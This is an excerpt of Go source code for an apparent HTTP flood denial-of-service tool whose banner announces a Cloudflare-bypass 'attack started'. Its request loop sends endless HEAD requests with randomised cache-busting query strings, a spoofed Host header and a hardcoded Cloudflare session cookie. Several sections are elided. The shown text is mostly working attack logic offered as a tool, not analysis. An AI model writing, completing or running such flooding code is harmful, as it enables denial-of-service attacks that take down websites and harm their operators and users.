...
func main() {
	...
	go func() {
		fmt.Println("-- BallBypas CF - BOT Reail Attack Started --\n           Go!\n\n")
...
func httpcall(url string, host string, s chan uint8) {
	...
	for {
		q, e := http.NewRequest("HEAD", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
		if e != nil {
			s <- callExitOnErr
			return
		}
	    ...
	    q.Header.Set("Host", "https://www.google.com/")
	    q.Header.Set("Cookie", "__cfduid=d56630e7a73c857f547e7d969af197d2e1497066824; PHPSESSID=c5lus6uvsrici4svjiuddlmnu2; HstCfa2893902=1497006608842; HstCmu2893902=1497006608842; c_ref_2893902=https://l.facebook.com/; HstCla2893902=1497043056664; HstPn2893902=6; HstPt2893902=14; HstCnv2893902=3; HstCns2893902=3")
...
func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+100))
	}
	return string(a)
}